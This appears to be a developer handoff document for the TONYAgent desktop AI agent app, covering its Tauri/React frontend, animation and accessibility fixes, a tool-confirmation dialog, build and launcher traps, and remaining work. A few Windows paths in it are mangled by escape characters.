an answer. See 1.15.

### Invariants — do not break these

1. **The reply to a request is written before any events that request causes.**
   A turn id is therefore known before its first delta. Enforced by
   `test_the_reply_for_a_request_comes_before_its_events` and its TS twin.
2. **Events carry no `id`; replies always do.** That is how a client tells them apart.
3. **A malformed line must not kill the server** — it replies `bad_request`
   and keeps serving.
4. **A rejection is a reply, never a push.** `send` on a busy session used to
   emit an ERROR event *before* the reply, which a client cannot attribute. Fixed.

---

## 3. The Tauri frontend (`app/`) - builds and runs

```
app/
  index.html                Vite entry
  vite.config.ts            base "./", port 1420
  tsconfig.json             the app; `tsc --noEmit`, no emit
  tsconfig.test.json        extends the above, emits ESM to .tmp for node --test
  src/
    main.tsx                mounts App
    App.tsx                 owns backend lifecycle, wires everything
    events.ts               reduces core events to render state
    MessageList.tsx         transcript + tool rows + ThinkingPanel
    Composer.tsx            input, Enter to send, effort dial
    ConversationList.tsx    saved chats, row menu, inline rename
    ConfirmDialog.tsx       destructive-action prompt
    StatusBar.tsx           provider / sandbox / connection
    IconRail.tsx            left rail (new chat, clear, stop, placeholders)
    Overlay.tsx             dismissible backdrop surface: owns its own lifecycle
    useDelayedUnmount.ts    how long a dismissed surface lingers; useLastValue
    useDismiss.ts           the one rule for closing a surface on an outside press
    TopBar.tsx              the window's own title bar: drag region, tab, caption
    WindowControls.tsx      the three caption buttons, presentational only
    useWindowControls.ts    caption actions, the system menu, F10; null in a browser
    styles.css              the entry: @imports the modules below, no rules
    styles/                 one module per surface, in cascade order (21 files)
    stylesheet.ts           readStylesheet / readStylesheetSource — the readers
    backend.ts              the protocol client
    test-dom.ts             installs jsdom on the globals; imported first
    test-render.ts          mount / act / type / press / query helpers
    layout.test.ts          reads the stylesheet's cascade, not its text
    *.test.ts, *.test.tsx   440 tests, all run by `npm test`
  src-tauri/
    tauri.conf.json         productName, window, CSP, externalBin, icons
    build.rs                app_manifest: the ACL name for the one app command
    src/system_menu.rs      GetSystemMenu + TrackPopupMenu, ~40 lines of unsafe
    capabilities/default.json
    Cargo.toml, build.rs, src/main.rs, src/lib.rs
    icons/                  generated from icons/icon.svg
    binaries/               PyInstaller sidecar output (gitignored)

**Every relative import in a component carries a `.js` extension.** Vite does
not need one; Node does, and the component tests are the components running
under Node. See 1.18.
```

### Visual design

### Sidebar order and motion

**Actions above, history below.** `.sidecol` is one column holding `IconRail`
then `ConversationList`. The rail is `flex: none` -- sized by its buttons -- and
the list is `flex: 1`, filling the rest and scrolling inside itself. The rail
used to carry a `flex: 1` spacer with the list at `max-height: 45%` above it,
which meant a cap invented for the list decided where the buttons landed.
There is no spacer and no cap any more; the buttons are pinned by construction.

**Every dismissible surface animates in both directions**, which needs three
pieces that have to agree:

| where | what |
| --- | --- |
| `styles/motion.css` + `styles/reduced-motion.css` | `--motion-fast` / `--motion-base` / `--ease-out` / `--ease-in`, the `@keyframes`, and one `[data-state="open"\|"closed"]` pair per surface. Split across two modules because the cancellation block has to come last |
| `useDelayedUnmount.ts` | keeps the node mounted after the close, so there is something to animate out of; `useLastValue` keeps what it was showing |
| `Overlay.tsx` | wraps the three backdrop surfaces and publishes `data-state` |

A surface that renders conditionally cannot *transition* into existence --
there is no "before" to transition from -- so the entry is a keyframe driven by
an attribute, and the exit is the same node playing the other keyframe. That
only works if something delays the unmount, which is the hook's whole job.

Three things that are easy to get wrong and are worth not re-breaking:

- **`--motion-fast` has one owner.** `useDelayedUnmount` reads it out of the
  document rather than restating `110`, because the delay and the animation it
  covers must not drift apart. Under `prefers-reduced-motion` it drops the node
  at once, since there is then no animation to wait for.
- **The reduced-motion block must match the specificity it cancels.** Every
  rule it turns off is written `.thing[data-state="open"]`, two classes deep; a
  plain `.thing` in the media query loses to that regardless of source order,
  and the animations keep playing for exactly the people who asked for them not
  to. The selectors there repeat `[data-state]` on purpose.
- **A closed overlay is `pointer-events: none`.** It is still on screen for the
  length of the exit, and a full-window backdrop left clickable swallows the
  next click.

The row menu and the log strip are not overlays -- one is `position: fixed` and
the other grows inline -- so both call the hook directly.

#### What running it for real changed

Everything above was checked in a browser preview first, and three things were
wrong there that only the packaged app showed. All three are the kind a unit
test cannot see, which is the argument for driving the real surface.

**1. `--motion-fast` comes back in seconds.** Chromium re-serialises a custom
property that holds a `<time>`: a stylesheet saying `110ms` reads back as
`0.11s`. Parsing the number and assuming milliseconds got `0.11`, so every
surface lingered 30ms under an animation that runs for 110 -- the exit was cut
off before it finished. jsdom does not re-serialise, so the test passed. The
unit is parsed now, and both spellings are asserted.

**2. Two backdrops.** The window wrapped each panel in an `Overlay` *and* the
panel carried one of its own, so the window behind the user was scrimmed twice
(visibly darker than the design) and the inner backdrop was permanently
`open`, which meant the dialog could never play its exit no matter what closed
it. The markup looked fine and every test passed. `Overlay` now asserts it
renders exactly one backdrop.

**3. Every tool card was green.** Found by asking the live agent to write a
file with no project folder selected. The card said "No project folder
selected" and was drawn in the colour that means "done", because the status was
read from the event type -- and the core emits `tool.completed` for every
finished call, success or not. It has a `tool.failed` type and never sends it.
The status is in the payload the core already sends, so that is where it is
read from now. Nothing to do with motion; found by running the thing.

To drive the webview itself:

```
$env:WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS="--remote-debugging-port=9333"
./tonyagent-app.exe
python scripts/probe_webview.py -e "document.title"
python scripts/probe_webview.py --screenshot shot.png
```

`probe_webview.py` has a **25 second** socket timeout, so an expression that
polls must return inside that or it fails with "timed out waiting for the
expression" -- send the action in one call and poll in later ones rather than
in one long `await`.

**The confirmation dialog is closed now** -- covered by
`app/src/ConfirmDialog.test.tsx` (9 tests). It genuinely cannot be reached in a
running app, and the reason is sharper than "needs the picker":
`tools/orchestrator.py` checks for a project folder *before* it asks, and the
one tool exempt from that check (`http_request`) is `destructive = False`, so
it can never reach the confirmation branch at all. No prompt gets there without
`sandbox.start`, and only the native picker calls it.

So the test renders the real `ConfirmDialog` through props built by the real
`applyEvent` from the exact payload `session._on_confirmation_requested` emits,
inside the real `Overlay`, with the real `styles.css` loaded into the document.
That last part is what makes two of the assertions real rather than nominal:
jsdom resolves no `animation-name` (every one reads back `none`), so the
keyframe names are asserted against the stylesheet's text; but it *does* cascade
ordinary declarations, so `pointer-events` and `--motion-fast` are the browser's
real values.

The keyframe names were then confirmed in the live webview on the settings
overlay, which rides the identical `.modal-backdrop[data-state] > .modal` rules:
open `fade-in`+`rise-in` @160ms with exactly one backdrop, close `fade-out`+
`rise-out` @110ms, `pointer-events: none`, `elementFromPoint` at the window
centre hits `.empty` rather than the backdrop, and the node leaves the DOM 149ms
after the close. (In Chromium `--motion-fast` reads back `.11s`, not `110ms` --
the re-serialisation from the first pass.

**Escape now denies the confirmation (fixed).** Found while observing above:
nothing handled Escape while the prompt was up, so a turn stayed blocked until
Allow, Deny, or the core's own 60s timeout. `ConfirmDialog` now binds a
**capture-phase** `window` keydown that calls `stopPropagation` and answers
`confirmed: false` -- denying, never allowing, because Escape is the reflexive
"get this off my screen" and someone reaching for it is not reading the tool
name. Capture plus `stopPropagation` is what keeps the two existing Escape
readers behind it (`App.tsx`'s Files overlay, `ConversationList`'s row menu,
both bubble-phase on `window`) from also acting on the same key.

Two details that are easy to get wrong and are now covered by tests:

- **Exactly once.** Both buttons and the key go through one `answer()` that
  records the call id it has already answered. The dialog stays mounted for the
  length of its own exit, so a second click or a held-down key would otherwise
  put a second `confirm.respond` on the wire for a call the core has settled.
- **The listener must not outlive the dialog.** A window listener left behind
  would keep swallowing Escape for the rest of the session -- the Files overlay
  and the row menu would silently stop responding to the keyboard. There is a
  test that presses Escape after the dialog is gone and asserts the key gets
  through.

Each of those was checked by mutating the component: inverting Escape to allow
-> 3 tests fail; removing the once-guard -> 3 fail; dropping to bubble phase ->
the leak test fails; removing the cleanup -> the listener test fails.

**One caveat about the test harness, learned the hard way here.** `press()`
dispatches on `window`, but a real browser delivers a key to the *focused
element*. Measured in the live webview: dispatching on `window` puts every
listener in the at-target phase, where `stopPropagation` does **not** separate
capture from bubble, while dispatching on `body` or the focused element does
stop the bubble listener dead. So the harness exercises the stricter case and
the behaviour it asserts is the one a real keypress depends on -- but do not
read a green run as proof that a `window`-targeted dispatch is blocked in
Chromium, because it is not.

Related trap in the same harness: `render()` keeps a **single** root, so calling
it twice in one test orphans the first tree instead of unmounting it. An
orphaned `ConfirmDialog` keeps its window listener alive for the rest of the
file, which surfaces as an unrelated Escape assertion failing several tests
later. One `render` per test.

Note there is still no button *named* cancel -- the buttons are "Allow" and
"Deny" -- and Escape is not labelled on screen. If that matters for
discoverability, `aria-keyshortcuts` or a hint line is the place to say it.

**Reduced motion, observed for real (one defect found and fixed).** The
`prefers-reduced-motion: reduce` block had never been run with the preference
actually set -- it was only ever read. `scripts/probe_media.py` emulates the
media feature over CDP on the same socket that evaluates the expression,
because `probe_webview.py` sends only `Runtime.evaluate` and emulated media
does not survive the connection. Measured in the packaged app:

| surface | reduced | normal |
| --- | --- | --- |
| settings overlay animations | `none`, 0 live | `fade-in`+`rise-in` @160ms, 2 live |
| overlay close to unmount | **3ms** | **148ms** |
| row menu close to unmount | **36ms** | **147ms** |
| `data-state`, `pointer-events` | published as usual | as usual |

So the `defaultDelay()` branch does what its comment claims: the node is
dropped at once instead of lingering as a ghost for a length of time nobody
asked for. The animation-cancelling half of the block holds up too.

**The one that was broken: `.tab-spinner`.** The top bar's busy indicator is
`spin 0.7s linear infinite`, and it was **not** in the block -- so a turn
showed a permanently rotating ring to precisely the people who had asked
their operating system to stop things moving. Measured in the browser, before
the fix: `animationName: spin`, `iterations: infinite`, `playState: running`
**identically under both settings**. It is now cancelled.

The fix cancels the animation only. The ring keeps its 12px size and its
lighter top edge (`rgb(235,235,235)` against `rgb(122,122,122)` on the side),
so it still reads as "busy" while standing still. Hiding the indicator would
have satisfied the preference by trading a real signal for a cosmetic one, and
a turn that looks finished is worse than a turn that looks still.

The block is a hand-written list, so it is now checked rather than trusted.
`app/src/reducedMotion.test.ts` fails if any animated selector in
the stylesheet is not covered, and `scripts/audit_reduced_motion.py` prints the
whole picture by hand. The test understands the two idioms the block is
written in -- naming a selector outright, and naming it with the attribute
*value* dropped (`.rowmenu[data-state]` covers
`.rowmenu[data-state="open"]`, matching both states and winning on source
order) -- because a matcher that does not would cry wolf on twelve
already-covered rules and get ignored. Verified by mutation: removing the
`.tab-spinner` cancellation, adding a new uncancelled infinite animation, and
lowering a cancellation's specificity each fail the test that names them.

**The row menu did not match the app it lives in (two real bugs).** Reading it
against the stylesheet turned up two things that were wrong rather than
merely plain, both measured in the packaged app before being fixed:

- **`Delete` was not red.** `.rowmenu-danger` was written as a bare class, and
  the rule it has to beat is `.rowmenu button` -- one class plus one element,
  strictly more specific than a single class -- so it lost wherever it sat in
  the file. Measured: `color: rgb(122, 122, 122)`, identical to Rename and
  Duplicate. The colour was in the stylesheet the whole time and had never once
  applied. It is now `.rowmenu button.rowmenu-danger`, and it sits *after* the
  hover rule rather than merely being specific enough: both are two classes
  plus an element, so the tie is broken by source order -- the same hazard
  `.btn-danger` documents further down the file.
- **Hovering a menu item painted it like a selected conversation.** The hover
  rule used `--raised`, which is `.chatrow.is-active`; the menu therefore
  rendered the conversation the user had *chosen* whenever they hovered an
  item. Measured: hovered background `rgb(33, 33, 33)`, selected row
  `rgb(33, 33, 33)`. Now `--hover`, which is what nine other rules use and what
  the chat rows themselves use.

`Delete` also gets a divider above it in the app's own `--border-soft`, plus a
5px gap, so the destructive action is not flush against the harmless ones.
Verified in the packaged app after the fix: Delete `rgb(201, 112, 95)`
(`--danger`), divider `0.571px solid rgb(30, 30, 30)` (`--border-soft`), and
hover `--hover` against a selected row still `rgb(33, 33, 33)`.

Three tests in `ConversationList.test.tsx`. The colour one resolves the rule
through the real stylesheet via `getComputedStyle` rather than matching its
text -- **a rule existing is not a rule winning**, which is the whole bug, so a
text assertion would have passed throughout. Two jsdom limits are recorded
there rather than worked around silently: it drops any shorthand containing
`var()`, so the divider is read from the stylesheet and checked on the real
menu in the browser instead; and it cannot resolve `:hover` at all, so the
hover rule is asserted on its text. Four mutations were tried against the
tests -- reverting the danger selector, restoring `--raised`, deleting the
divider, removing the gap -- and each fails the test that names it.

`observe_confirm_contract.py` covered the core half end to end against the
real `ToolOrchestrator` and the real `write_file`: one request per untrusted
destructive call, the five payload keys the dialog reads, approve runs the tool
and writes the file, deny returns CANCELLED with the filesystem untouched, and a
second answer for the same call changes nothing.


Every value is sampled from a **full-DPI** screenshot of the Freebuff desktop
app, not eyeballed. `scripts/shot_screen.ps1` copies the screen rectangle and
`scripts/png_measure.py` decodes it into colour runs along a row and down a
column, reporting physical pixels and CSS pixels side by side.

**Capture at full DPI or every number here is wrong.** This is the most
expensive mistake in this file's history, so it is worth stating plainly. The
display is at 1.75 scale, and `CopyFromScreen` called from a DPI-unaware process
returns *logical* pixels — a first pass measured a 1655x990 image and recorded
`70px | 1fr | 425px` with a 42px bar. The real window is 2879x1799 physical:
the rail is 52px, the list column 255px, the bar 48px, and the composer 720px.
Every figure below was re-measured from a full-DPI capture. `shot_screen.ps1`
now calls `SetProcessDpiAwarenessContext(PER_MONITOR_AWARE_V2)` before any GDI
call, and reports 2880x1800 where it used to report 1646x981.

**A partial capture is not enough either** — the first pass also got the accent
wrong, because the chromatic element was outside the captured region.

```
--bg       #1c1d1c   72.5%  transcript, the list column, everything recessive
--chrome   #292b2a    7.0%  the title bar AND the full-height icon rail
--surface  #222423    4.6%  the composer's field -- the one recessed panel
--input    #262827          inset wells and filter fields
--raised   #313330    2.9%  raised cards
--chip     #3b3e3a    0.4%  the selected row, the tab pill, a selected rail item
                            ^ the reference's chip, and what we borrowed then
--hover    #373a35          hover
--border   #363836          hairlines
--fg       #dedfdd          body text          (luminance 222)
--fg-dim   #a1a39f          secondary text     (162)
--fg-mute  #7c807a          metadata           (116)
--accent   #bacda9          the ONE chromatic element
                            ^ the reference's sage; ours is #6393f0, read out of
                              our own icon. See the sweep section.
```

**The reference is 99.5% neutral — 0.47% of its pixels carry any chroma, and
every one of them is the accent.** There is no blue-grey anywhere in it. A tint
added "for depth" is the one change that cannot survive a side-by-side
comparison.

**`#292b2a` is a warm green-grey, not a neutral dark grey.** A neutral `#2a2a2a`
is a different colour and reads as a different app beside the reference.

**The accent is a desaturated sage, not a brand colour.** Do not "tidy" it
towards saturation. A purple was tried first and was wrong in a way only a
comparison could have caught.

Layout, all measured at 1.75 scale **off the reference**: `52px | 1fr | auto`
grid, **48px** top bar, transcript inset to **720px**. *Those are the
reference's numbers and they are the right evidence for the decisions below;
ours are different and live in `:root` — see the sweep section.*

**The rail is `--chrome` and runs the full height of the window.** It has to be
the *column* that is painted, with `.chatlist` painting `--bg` back over it, and
not `.rail` alone: the rail is sized by its buttons (`flex: none`) and the list is
what fills the rest of the column, so a background on `.rail` stops the strip at
the last icon. This is the clearest single difference between the two apps.

**The rail became a strip, and the list moved beside it.** They used to be
stacked in one column — actions above, history below — which meant the rail
could not be full height (it stopped at the last icon) and opening the sidebar
put a 236px chrome block *above* the list. The reference is two columns at every
width: a 52px strip and a 255px list, so `.sidecol` is a `row` now,
`--rail-w-expanded` is 307 (52 + 255, their sum), and the rail has no expanded
state at all. **Its text labels went with it** — the reference never labels its
rail, and the conversation titles belong in the list anyway. `title` and
`aria-label` still carry each icon's name, which is where a keyboard user reads
it, so nothing became unreachable.

The 236px width had a documented reason: at the reference's list width a
conversation title truncated to "Explain the sidecar stdi…". Matching the
reference *solves* that rather than trading against it — the list gets the
reference's own 255px, which is 19px more than the compromise gave it, because
the rail no longer has to share the column.

**Dark only.** The reference is dark-only and a light theme would need a second
full palette to be worth shipping. The Tkinter UI keeps its own light/dark
system, so the two clients no longer match on this point — a deliberate trade,
recorded here rather than left to be discovered.

The composer is **two rows in one field**: textarea on top, controls beneath
(Build/Plan/Mission/Skills, model chip, Continue). Putting the buttons beside
the input would steal line length. Mode pills are presentation-only — there is
no protocol method to set a mode, and inventing one client-side would let the
UI claim a capability the core lacks.

The Files sidebar is populated from tool events the core reported, not by
walking the filesystem from the UI. The core owns the sandbox and the folder;
a second source of truth about that state is how the Tkinter UI drifted.

**The Files panel is closed by default; the icon rail is open.** A 425px panel
was eating the transcript on a normal window before the agent had touched a
single file, so `filesOpen` starts `false` and the collapsed panel leaves a
small folder button at the top-right to reopen it. The rail stays open: it is
the app's only navigation, and the reference design keeps it visible.
`railOpen` and `filesOpen` are independent, and each has its own button (the
top-bar "Toggle sidebar" and the panel's own hide/show).

### CSS traps hit here

- **Rule order beats intent at equal specificity.** `.btn-accent` and `.btn`
  are both single-class selectors, so the later rule wins. `.btn-accent` was
  declared first and the grey `.btn` background silently overrode it — the
  button rendered grey with no error anywhere. Variants must come after the
  base rule.
- **The rail must be pinned with `grid-column: 1` and `.main` with
  `grid-column: 2`.** Otherwise removing the rail makes `.main` the first grid
  item, so it auto-places into the collapsed zero-width track and the
  transcript vanishes entirely.
- Collapsing the rail needs `grid-template-columns: 0 ...` too, or the 70px
  track stays reserved.

### Typography

`Inter` (body) and `JetBrains Mono` (paths, diff stats, log strip), self-hosted
as woff2 in `app/src/fonts/`. Do not go back to `system-ui`: the whole point of
a desktop app is that the layout someone tuned is the layout a user gets, and
the system stack rendered differently per machine. The fonts ship inside the
binary, so there is no offline first-launch gap and no CDN to wait on.

Details that are deliberate, not incidental:

- **latin + latin-ext only.** Google's per-script split is kept, so a latin-ext
  character pulls in the second file only when one actually appears. Verified
  live: adding `ężł` flipped the second Inter face to `loaded`.
- **One variable file per family per script.** Weights 400/500/600 are all used,
  and a variable font covers the range in one download.
- **`font-display: block`, not `swap`.** A flash of light Segoe before Inter
  arrives is worse on a dark UI than a brief blank, and the fonts are local, so
  the block period is a disk read rather than a network wait.
- **`font-src 'self'` had to be added to the CSP.** `default-src 'self'` does
  not cover fonts, so without it every face silently fails to load and the app
  quietly falls back to the system font - which looks like "the change did
  nothing" rather than like an error.
- **`tabular-nums` on the status bar and rail badge.** Both show values that
  change while you watch, and proportional figures make the whole line twitch.
- The system fonts stay in the stack as a last resort, so a woff2 that fails to
  decode degrades to readable text instead of nothing.

Cost: 176 KB of fonts, and the installer grew 0.16 MiB.

### Do not test `key.save` against a provider that has a real key

`key.save` writes to the **real OS keyring**. A canary value typed into a live
provider slot overwrites the user's actual credential, and the damage is silent
until a real request 401s. This happened here: a canary written to `groq` broke
`test_chat_path_streams_end_to_end[groq]` with "The groq key does not start with
'gsk_'", which is the only reason it was caught.

The pytest suite is safe - `test_the_key_never_appears_on_stdout` and friends
monkeypatch a fake `keyring`, so no OS store is touched. Anything run by hand
against `python -m tonyagent.headless.server` is **not**. Use a provider with no
stored key (`ollama`, `custom`) and delete it afterwards, or just read the
code. The UI check was done against `ollama` with `dummy-not-a-real-key`.

### Launchers

Two, and they reach different clients:

- `Start TONYAgent.bat` — Tkinter UI (`python -m tonyagent`). Unchanged.
- `Start TONYAgent (Tauri).bat` — Tauri + React UI. Checks python, node, npm
  and cargo; adds `%USERPROFILE%\.cargoin` to PATH if cargo is missing
  (rustup registers it in the USER path, which a process launched from Explorer
  does not always inherit); builds the sidecar if it is absent; then
  `npm run tauri:dev`.

The sidecar check globs `app\src-tauriinaries	onyagent-core-*.exe` because
the filename carries a target triple that differs per machine. It only tests
existence — if you change the Python core, delete the exe and re-run.

**Note the parentheses in the filename.** They are cmd metacharacters, so
`call "Start TONYAgent (Tauri).bat"` from another batch file fails with
`is not recognized as an internal or external command`. Double-clicking from
Explorer is unaffected. Invoke it from a script with `Start-Process` instead.

### Inspecting the UI

`scripts/probe_webview.py` evaluates JS in the running webview and can
screenshot it:

```bash
# launch with a debug port
WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS="--remote-debugging-port=9333" ./tonyagent-app.exe
python scripts/probe_webview.py -e "document.title"
python scripts/probe_webview.py --screenshot shot.png
```

Prefer this over a Win32 screenshot. `PrintWindow` on a WebView2 window only
paints regions the app recently invalidated, so it returns large black bands
that look exactly like a broken layout -- which sent me chasing a non-existent
CSS bug. `Page.captureScreenshot` asks the compositor for the real frame.

Note that `vite build` alone is not enough to see a change in the packaged app:
`tauri build` embeds `dist/` into the binary.

The Rust side is deliberately tiny: it opens a window and registers the shell
and dialog plugins. All protocol logic is in `src/backend.ts`, already covered
by tests.

**The native folder dialog cannot be driven over CDP.** `pickFolder()` opens a
real OS dialog, which blocks the webview and is invisible to
`probe_webview.py` - a call to it just times out. To test the paths behind it,
either drive the protocol directly (`sandbox.start` with a path) or render the
panel against a stub. Do not conclude the picker is broken from a probe
timeout.

**The preview panel will not composite an image-only page.** Serving a bare
`<img>` of a screenshot through `register_preview` rendered a blank frame
several times this session; inlining it as a data URI in a tiny HTML file
worked once and then stopped. When it misbehaves, verify the UI through
computed styles via `probe_webview.py` instead - that is dependable and was
enough to confirm every token.

### Building the sidecar

```bash
python scripts/build_sidecar.py          # ~45 MB exe into src-tauri/binaries/
```

PyInstaller spec is `scripts/sidecar.spec`. It **excludes `tkinter`,
`customtkinter` and `playwright`** - the headless core must not pull in a GUI
toolkit (that boundary is tested), and Playwright runs inside the Docker
sandbox, not on the host.

The frozen binary speaks the protocol correctly. Verified directly against the
built exe: `ping`, `state`, an unknown method, a malformed line, and a second
`ping` all behave per section 2 - a bad line replies `bad_request` and the
server keeps serving.

**REBUILD THE SIDECAR AFTER EVERY PYTHON CHANGE.** This is the single most
expensive trap here, and it cost two wrong diagnoses this session. The
`Start TONYAgent (Tauri).bat` launcher only checks that the sidecar *exists*,
not that it is current, so:

- You edit `server.py`, add a protocol method, restart `tauri dev`, and the
  method comes back `unknown_method` - or, worse, keeps its old behaviour.
- Meanwhile `python -m tonyagent.headless.server` (which runs from **source**)
  works perfectly, so a CLI test passes and proves nothing about the app.

If a protocol change "isn't taking effect", rebuild before investigating
anything else. Same applies to the Rust side: `tauri dev` does rebuild that
itself, so the Python side is the asymmetric one.

```bash
cd app && python ../scripts/build_sidecar.py    # ~40s
```

The prebuilt path does not have this problem.
`Start TONYAgent (Prebuilt).bat` asks `scripts/build_state.ps1` what is
stale, runs only those stages of `Build TONYAgent.bat`, and then starts the
app -- so a Python change made since the last build is picked up by
double-clicking, and a build that fails leaves the previous binary in
place rather than leaving nothing to launch. `tauri dev` is the asymmetric
one, and it is the loop this section is about.

### Layout rules that cost real time (tauri 2.12)

These were each a silent failure with a build that looked fine:

1. **`tauri.conf.json` and `capabilities/` live INSIDE `src-tauri/`.** With
   them at `app/`, the CLI resolves the Tauri dir to `app/` and fails with
   `failed to watch app\Cargo.toml`.
2. **`frontendDist` is `../dist`** once the config is in `src-tauri/`.
3. **`bundle.externalBin` is the BARE name** (`binaries/tonyagent-core`).
   Tauri appends `-<target-triple>` itself; putting the triple in the config
   gives `resource path ...-<triple>-<triple>.exe doesn't exist`.
4. **`Command.sidecar()` takes the same string as `externalBin`**, so it is
   also `binaries/tonyagent-core`. Tauri compares them literally (also
   accepting the name minus `.exe`). The bare `tonyagent-core` fails with
   `sidecar not configured under tauri.conf.json > bundle > externalBin`.
5. **The capability `allow` entries use the same `binaries/tonyagent-core`
   name.** The bare name fails with `Scoped command ... not found`.
6. **`shell:allow-stdin-write` is required as a separate permission.** With
   only `allow-execute`/`allow-spawn`, the sidecar *starts* and every request
   then fails with `Command plugin:shell|stdin_write not allowed by ACL`.
   `shell:allow-kill` is granted for the same reason (teardown).

Points 4-6 all fail at *runtime*, not build time, and the only symptom is a
window that says "disconnected". If that happens again, read the error banner:
it carries Tauri's exact message.

### Debugging a release build

`PrintWindow`/screenshot capture is unreliable for a WebView2 window. To see
the real error instead:

```powershell
$env:WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS="--remote-debugging-port=9333"
.	onyagent-app.exe
# then query http://localhost:9333/json/list and evaluate in that target
```

The UI surfaces the same thing: the error banner shows the plugin's message and
a log strip shows core stderr (core logs to stderr because stdout is
protocol-only).

---

## 4. Toolchain: MSVC is installed

`cargo build` links. The previous handoff's blocker is resolved.

```
Visual Studio Community 2026 at C:\Program Files\Microsoft Visual Studio8\Community
VC tools 14.51.36231 (link.exe present)
rustc 1.98.1, cargo 1.98.1, WebView2 154.0.4258.37
tauri-cli 2.12.0, PyInstaller 6.21.0
```

Note `where link.exe` also matches Git's `usr/bin/link.exe`, which is a
coreutils symlink and not a linker. The VS install is what unblocked the build;
a successful link is the proof.

`tauri build` produces both an MSI and an NSIS installer (~48 MB each,
sidecar included).

---


## 5. Non-obvious things a future session must know

1. **Docker Desktop is not a Windows service** on this machine. Start it with
   `Start-Process "$env:LOCALAPPDATA\Programs\DockerDesktop\Docker Desktop.exe"`
   and wait 2-3 min; the engine pipe is absent until then.
2. **The sandbox container name is fixed** (`tonyagent-sandbox`) and `start()`
   removes a same-named container as stale. Two TONYAgent processes (or pytest
   beside the app) **will kill each other's sandbox**. Override with
   `TONYAGENT_SANDBOX_CONTAINER=<name>`. Never run `pytest -m docker` and
   `scripts/e2e_*.py` concurrently.
3. **The console is cp949** and crashes scripts that print emoji or a checkmark.
   Keep new scripts ASCII-only. Force UTF-8 with `$env:PYTHONIOENCODING="utf-8"`.
4. **PowerShell swallows native stderr.** `python x.py` writing to stderr makes
   the runner report "command failed" and hides stdout. Use
   `cmd /c "... > out.txt 2>&1"` and then read the file.
5. **Node test runs do not always exit.** `node --test` left a process alive on
   this machine; use `Start-Process -PassThru` + `WaitForExit(ms)` + `Kill()`.
6. **The OpenRouter key in the keyring is rate/credit limited:**
   `403 {"message":"Key limit exceeded (total limit)"}`. The key itself is valid
   (73 chars, `/models` returns 458 entries). Raise the limit in the OpenRouter
   dashboard or use a different key. This is **not** a code problem.
7. `execute_command` **fails closed** with no sandbox unless
   `tools.fallback_to_local=true` (env `TONYAGENT_TOOLS__FALLBACK_TO_LOCAL`).
8. `orchestrator.execute_tool()` is **sync** and raises if called from async
   context. From a coroutine use `await tool_orchestrator.execute_tool_async()`.
9. **There is no working groq key any more.** Phase 2 overwrote the real one
   with a canary while testing `key.save` by hand, and it was deleted rather
   than restored. So `test_chat_path_streams_end_to_end[groq]` fails with
   "The groq key does not start with 'gsk_'". **Ask the user to re-enter it in
   Settings, or ignore that one test.** An environment gap, not a regression -
   do not "fix" it in code.
10. **A real end-to-end turn now has its first live exercise (Phase 5), but no
   successful hosted reply yet.** The sidecar turn path was driven against
   OpenRouter with a custom model id and reached the provider, which answered
   `403 Key limit exceeded (total limit)` (free slugs: `rate_limit`) -- a
   provider error surfaced correctly, not a code failure. A *successful*
   complete turn was then proven against a local mock OpenAI-compatible
   endpoint bound through the new `base_url` field. What remains is a
   successful reply from a hosted model: raise or replace the OpenRouter key
   (item 6) and re-run. The full Python suite is green (244 passed, including
   the groq chat test, which stubs its transport).

---

## 6. The one boundary that must not break

`tests/unit/test_headless_core.py::test_core_import_does_not_pull_in_a_gui_toolkit`
spawns a subprocess, imports `tonyagent.core.session` and
`tonyagent.headless.server`, and asserts `sys.modules` contains neither
`tkinter` nor `customtkinter`.

This exists because `core/__init__.py` used to re-export `TONYAgentApp`, which
imports customtkinter — so **any** `tonyagent.core.*` import dragged in a GUI
toolkit and made the core unusable as a sidecar. It is now a lazy
`__getattr__`, and `from tonyagent.core import TONYAgentApp` still works.

If that test ever fails, the headless boundary is broken. **Fix the import, do
not delete the test.**

---

## 7. Remaining work, in the order it should be done

### 7.1 Done (was blocked on MSVC)

1. `cargo build` verified.
2. `app/src-tauri/` written.
3. Core bundled via `scripts/build_sidecar.py`.
4. React UI written; it only subscribes to events, no turn logic.
5. `npm run tauri dev` and `npm run tauri:build` both work; the app was
   confirmed running, connected, and completing a send.

### 7.1b Phase 5: custom model and endpoint

`bind_provider` now takes `{name, model?, base_url?}` and echoes `base_url`
back; `state` reports it too, so a reloaded window reopens the panel
pre-filled. The settings panel's model field became a free-text input with a
`<datalist>` of the provider's known ids instead of a `<select>`, and an
optional Base URL row sits under it. This is what makes the `custom` provider
usable: it raises `ValueError` without a `base_url`, and the handler now turns
that into a clean `rejected` reply instead of an opaque internal error. Three
new tests in `test_headless_core.py` cover the arbitrary model id, the
`base_url` round trip through `state`, and that rejection.

### 7.2 Next, in the Tauri UI

**Done across Phases 1-4** (see 1.3-1.6): folder picker, settings panel,
sandbox start/stop, API keys, search, the four composer modes, and Markdown
rendering. All five rail buttons are live and no control is
presentation-only any more.

1. ~~**Project folder picker.**~~ Done (Phase 1) - `@tauri-apps/plugin-dialog`,
   wired to `sandbox.start({path})`, reachable from the rail and the Files panel.
2. ~~**Settings panel.**~~ Done (Phase 1) - `SettingsPanel.tsx`, driven by
   `bind_provider`, `sandbox.start`/`.stop` and `trust.set`.
3. ~~**API key entry.**~~ Done (Phase 2) - `key.save` / `key.delete` plus a
   password field. See the security note in 1.4 before touching it.
4. ~~**Sandbox controls.**~~ Done (Phase 1) - start/stop in the settings panel.
5. ~~**Search.**~~ Done (Phase 2) - `SearchPanel.tsx` over the core `search`.
6. ~~**`events.ts` has no tests.**~~ Done (Phase 3) - 15 tests, which found the
   reducer mutating its input. 35 frontend tests total.
7. ~~**Composer modes.**~~ Done (Phase 3) - see 1.5. Enforced in the
   orchestrator, not just the prompt.
8. ~~**Markdown rendering.**~~ Done (Phase 4) - see 1.6. Parser + renderer +
   16 tests, no new dependency.

**Still open, in the order I would do them:**

1. **Run one real end-to-end turn.** *Partially done (Phase 5).* The turn
   machinery now has its first live exercise: spawn the real sidecar, `ping`,
   `bind_provider` with a custom OpenRouter model id, `send`, and read the
   streamed events. It reached `message.started` and then `turn.failed` with
   the provider's own error surfaced verbatim -- the core path is sound, the
   failure was billing (`403 Key limit exceeded (total limit)`), not code. A
   complete *successful* reply was then proven separately against a local mock
   OpenAI-compatible SSE endpoint bound through the new `base_url` field: the
